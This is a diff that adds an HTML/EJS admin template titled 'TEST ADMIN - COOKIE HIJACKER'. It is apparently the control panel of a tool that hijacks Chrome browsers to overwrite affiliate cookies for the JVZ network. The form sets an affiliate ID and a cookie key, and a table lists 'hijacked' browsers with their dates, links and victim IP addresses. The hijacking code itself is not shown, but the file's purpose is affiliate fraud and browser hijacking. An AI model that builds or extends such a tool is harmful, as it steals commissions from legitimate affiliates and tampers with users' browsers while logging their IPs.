@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Simple Admin</title>
+    
+    <!-- Latest compiled and minified CSS -->
+    <link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
+    
+</head>
+<body>
+
+    <div class="container">
+
+        <h3 style = "font-weight: 900">TEST ADMIN - COOKIE HIJACKER</h3>
+        <div class = "row">
+
+            <div class = "col-xs-12 col-sm-12 col-md-4">
+
+              <form action = "" method = "POST">
+                    <div class="form-group">
+                        <label><b>Affiliate Network</b></label>
+                        <select name = "network" class = "form-control">
+                            <option value = "jvz">JVZ</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label><b>Affiliate ID</b></label>
+                        <input value = "<%= affiliate_id %>" name = "affiliate_id" type = "text" class = "form-control"  />
+                    </div>
+                    <div class="form-group">
+                        <label><b>Cookie Key</b></label>
+                        <p><b><small>Obtained manually from the browser when the link is launched</small></b></p>
+                        <input value = "<%= cookie_key %>" name = "cookie_key" type = "text" class = "form-control"  />
+                    </div>
+                    <% if(error){ %>
+                    <p class = "alert alert-danger"><b><%= error %></b></p>
+                    <% } %>
+                    <% if(success){ %>
+                    <p class = "alert alert-success"><b><%= success %></b></p>
+                    <% } %>
+                    <button  name= "set_hijack" type = "submit" class = "btn btn-lg btn-danger">Set Active</button>
+              </form>
+
+
+            </div>
+            <div class = "col-xs-12 col-sm-12 col-md-8">
+                <h4>Realtime Hijacked Chrome Browsers</h4>
+            
+                <table class = "table">
+                    <tr>
+                        <th>Date</th>
+                        <th>Link</th>
+                        <th>Network</th>
+                        <th>IP Address</th>
+                    </tr>
+
+                    <% 
+                    for(let v of users){
+                    %>
+                     <tr>
+                        <td><%= v["date"] %></td>
+                        <td><%= v["link"] %></td>
+                        <td><%= v["network"] %></td>
+                        <td><%= v["ip"] %></td>
+                    </tr>
+                    <% } %>
+                </table>
+                <% if(users.length < 1) %>
+                <p class = "alert alert-info"><b>No browser hijacked yet...</b></p>
+
+
+            </div>
+
+
+
+        </div>
+
+
+
+
+
+
+
+    </div>
+   
+</body>
+</html>
